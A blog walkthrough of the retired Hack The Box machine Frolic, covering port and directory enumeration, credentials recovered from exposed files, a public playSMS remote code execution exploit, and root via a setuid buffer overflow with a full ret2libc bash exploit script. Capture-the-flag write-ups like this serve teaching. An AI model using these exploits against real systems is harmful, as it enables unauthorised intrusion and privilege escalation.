---
layout: post
title: "Frolic: Hack The Box Walkthrough"
date: 2019-03-24 07:33:05 +0000
last_modified_at: 2019-03-24 07:40:25 +0000
category: Walkthrough
tags: ["Hack The Box", Frolic, retired]
comments: true
image:
  feature: frolic-htb-walkthrough.jpg
  credit: richardsdrawings / Pixabay
  creditlink: https://pixabay.com/en/spring-lamb-happy-outdoor-meadow-2920471/
---

This post documents the complete walkthrough of Frolic, a retired vulnerable [VM][1] created by [sahay][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Frolic is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.111
...
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        syn-ack ttl 63 Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Node-RED
9999/tcp open  http        syn-ack ttl 63 nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!                
```

`nmap` finds `22/tcp`, `139/tcp`, `445/tcp`, `1880/tcp`, and `9999/tcp` open. Nothing interesting stood out from the Samba enumeration.

```
Host script results:
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2018-12-30T18:53:25+05:30
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2018-12-30 13:23:25
|_  start_date: N/A
```

Well, this is how the two `http` services look like.

_`1880/tcp`_


{% include image.html image_alt="121b8358.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/121b8358.png" %}


_`9999/tcp`_


{% include image.html image_alt="9aa5e98e.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/9aa5e98e.png" %}


### Directory/Files Enumeration

Let's use `wfuzz` like I normally do with `9999/tcp` first.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.111:9999/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.111:9999/FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000060:  C=301      7 L       13 W          194 Ch        "admin"
000111:  C=301      7 L       13 W          194 Ch        "backup"
000273:  C=301      7 L       13 W          194 Ch        "dev"
000834:  C=301      7 L       13 W          194 Ch        "test"

Total time: 19.39293
Processed Requests: 950
Filtered Requests: 946
Requests/sec.: 48.98690
```

***This is how `/admin` looks like.***


{% include image.html image_alt="88846467.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/88846467.png" %}


The login page is controlled by a poorly coded JavaScript like so.


{% include image.html image_alt="7468cbfb.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/7468cbfb.png" %}


Heck. I don't even need to enter to the password. A successful login attempt gets redirected to `success.html`.


{% include image.html image_alt="3de4cc3e.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/3de4cc3e.png" %}


The above is uttered in [Orangutan](https://esolangs.org/wiki/ook!) words, which after decoding looks like this.


{% include image.html image_alt="b978c3fc.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/b978c3fc.png" %}


Lame. I know. And this is how `/asdiSIAJJ0QWE9JAS` looks like.


{% include image.html image_alt="af53b274.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/af53b274.png" %}


This is getting lamer. That's the `base64` encoding of a password-protected Zip file.

Long story short, the password to unzip the file is `password`. Duh??!!

And, the final message is in [Brainfuck](https://esolangs.org/wiki/brainfuck).


{% include image.html image_alt="40fe89b1.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/40fe89b1.png" %}


It reveals what appears to be a password.


{% include image.html image_alt="574e65ac.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/574e65ac.png" %}


***This is how `/backup` looks like.***


{% include image.html image_alt="1b5ecdd4.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/1b5ecdd4.png" %}


The two files `password.txt` and `user.txt` are available. However, I don't know what value they provide at this point. Or, maybe not at all.

```
password - imnothuman
user - admin
```

***The directory `/dev` contains more directories like so.***

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.111:9999/dev/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.111:9999/dev/FUZZ
Total requests: 950

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000111:  C=301      7 L       13 W          194 Ch        "backup"
000834:  C=200      1 L        1 W            5 Ch        "test"

Total time: 19.31173
Processed Requests: 950
Filtered Requests: 948
Requests/sec.: 49.19287
```

The directory `/dev/backup` provides a hint to a new directory: `/playsms`. Here's how it looks like.


{% include image.html image_alt="688bc7ed.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/688bc7ed.png" %}


### playSMS Remote Code Execution

An attack surface finally emerges! The credential to log in to the web application is (`admin:idkwhatispass`)


{% include image.html image_alt="fd7e2141.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/fd7e2141.png" %}


I'm assuming this is the vulnerable version which is susceptible to remote code execution. In which case, there's a ready-made [exploit](https://github.com/jasperla/CVE-2017-9101) just for it.


{% include image.html image_alt="b9dd9234.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/b9dd9234.png" %}


In equally lame situation, the exploit works and we have ourselves an interactive shell.

## Low-Privilege Shell

Let's upgrade the interactive shell to a full TTY shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl-z
stty raw -echo
fg
reset
```

The `user.txt` is in `ayush`'s home directory.


{% include image.html image_alt="249d3546.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/249d3546.png" %}


## Privilege Escalation

During enumeration of `www-data`'s account, I noticed a `setuid` executable at `/home/ayush/.binary/rop`.


{% include image.html image_alt="c5906e2e.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/c5906e2e.png" %}


If the name of the executable is anything to go by, I'm guessing that the privilege escalation has something to do with return-oriented programming (or [ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)).

I also noted that address space layout randomization (or [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)) is disabled, which is going to help us in getting root. Here's how to check.


{% include image.html image_alt="815a951e.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/815a951e.png" %}


In order to better analyze the executable, I transfer it over to my attacking machine where I have my PEDA for GDB installed.


{% include image.html image_alt="73cb711c.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/73cb711c.png" %}


Here, I have a breakpoint set up at `0x8048508` with `b *vuln+16` and running the program with `r $(perl -e 'print "A" x100')`, which is to run the executable with a 100 `A`s.


{% include image.html image_alt="8e8eec92.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/8e8eec92.png" %}


A couple of instructions down, I'm at `0x8048527` before the 100 `A`s get printed to `stdout`. Notice the buffer containing the 100 `A`s is at `0xffffd258`.


{% include image.html image_alt="c27d68b9.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/c27d68b9.png" %}


Here, just before EIP executes the next instruction (`ret`), notice the return address is at `0xffffd28c`, which is 52 bytes (`0xffffd28c - 0xffffd258`) away from the buffer of 100 `A`s. We can control the return address through buffer overflow!

The general exploit construct looks like this: `./rop $(perl -e 'print "A" x 52 . "<4-byte return address>"')`. Let's run the proof-of-concept with `strace`.


{% include image.html image_alt="bb1aa20b.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/bb1aa20b.png" %}


Recall that ASLR is disabled? And, because the executable is linked dynamically with `libc`, we can perform a specific ROP technique known as `ret2libc`.

Armed with this knowledge, let's write a automated exploit in `bash` to get our `root` shell.

<div class="filename"><span>ret2libc.sh</span></div>

```bash
#!/bin/bash

# Get all the addresses
TARGET="$(readlink -f $1)"
LIBC_INFO="$(ldd $TARGET | grep libc)"
LIBC_BASE="$(awk '{ print $NF }' <<<"$LIBC_INFO" | tr -cd '[x0-9a-f]')"
LIBC_FILE="$(awk '{ print $3 }' <<<"$LIBC_INFO")"
SYSTEM_OFFSET="0x$(readelf -a $LIBC_FILE | grep -m1 "system@" | awk '{ print $2 }')"
SYSTEM_ADDR="$(printf "0x%08x" $((LIBC_BASE + SYSTEM_OFFSET)))"
BIN_SH_OFFSET="$(grep -oba '/bin/sh' $LIBC_FILE | cut -d':' -f1)"
BIN_SH_ADDR="$(printf "0x%08x" $((LIBC_BASE + BIN_SH_OFFSET)))"

# Construct exploit string
RET_ADDR="$(sed -r 's/^0x(..)(..)(..)(..)$/\\x\4\\x\3\\x\2\\x\1/' <<<"$SYSTEM_ADDR")"
PAYLOAD_ADDR="$(sed -r 's/^0x(..)(..)(..)(..)$/\\x\4\\x\3\\x\2\\x\1/' <<<"$BIN_SH_ADDR")"

# Exploit
$TARGET $(perl -e "print 'A' x 52 . \"$RET_ADDR\" . \"JUNK\" . \"$PAYLOAD_ADDR\"")
```

Copy `ret2libc.sh` to the target host where we have `rwx` permissions, e.g. `/tmp`, and run the exploit script.


{% include image.html image_alt="338577f4.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/338577f4.png" %}


Voila!

Getting `root.txt` is a piece of cake when you have `root` shell.


{% include image.html image_alt="91ad77cf.png" image_src="/e62b5b76-4a2f-4274-810b-595b3ca4eeb6/91ad77cf.png" %}


:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/158
[2]: https://www.hackthebox.eu/home/users/profile/27390
[3]: https://www.hackthebox.eu/
